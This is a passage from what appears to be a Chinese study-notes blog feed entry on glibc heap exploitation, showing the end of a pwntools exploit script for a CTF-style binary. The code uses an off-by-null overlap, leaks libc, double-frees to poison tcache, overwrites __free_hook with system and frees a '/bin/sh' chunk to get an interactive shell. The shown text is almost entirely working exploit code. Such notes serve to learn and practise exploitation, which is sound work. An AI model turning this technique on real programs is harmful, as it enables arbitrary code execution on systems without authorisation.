    add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span><span class="token comment">#此chunk的大小至少为0xf0，因为off-by-null会将低位修改为0。</span>
    add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
    
    delete<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x10</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x120</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#制造假chunk头，0x120为前面序号为7和8的chunk大小和，把        序号为9的chunk的pre_size位修改为0x100</span>

    delete<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token comment">#堆向前合并掉序号为8的chunk</span>
    add<span class="token punctuation">(</span><span class="token number">0xc0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span><span class="token comment">#这两个chunk的大小加起来正好等于序号为7的chunk</span>
    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span><span class="token comment">#此chunk的大小必须为属于序号为8的chunk的大小</span>

    show<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>

    leak_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"\x7f"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"leak_addr = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>leak_addr<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

    __malloc_hook <span class="token operator">=</span> leak_addr <span class="token operator">-</span> <span class="token number">0x60</span><span class="token operator">-</span><span class="token number">0x10</span>
    
    libc_base <span class="token operator">=</span> __malloc_hook <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__malloc_hook"</span><span class="token punctuation">]</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"libc_base = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
    fake_chunk <span class="token operator">=</span> __malloc_hook <span class="token operator">-</span><span class="token number">0x23</span>

    free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"free_hook  = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
    system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"system  = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

    add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment">#分割unsortbins的大小。其实是为了让序号为8的那块chunk归我所用</span>

    delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token comment">#double free</span>

    add<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#将其的fd指针指向free_hook</span>

    add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token comment">#将0x55cd056ba60的chunk申请掉</span>
    add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#将__free_hook修改为system的地址</span>

    delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>
 
exp<span class="token punctuation">(</span><span class="token punctuation">)</span>  

io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
]]></content>
      <categories>
        <category>学习</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Heap</tag>
        <tag>二进制</tag>
        <tag>tcache</tag>
        <tag>高libc</tag>
      </tags>
  </entry>
</search>
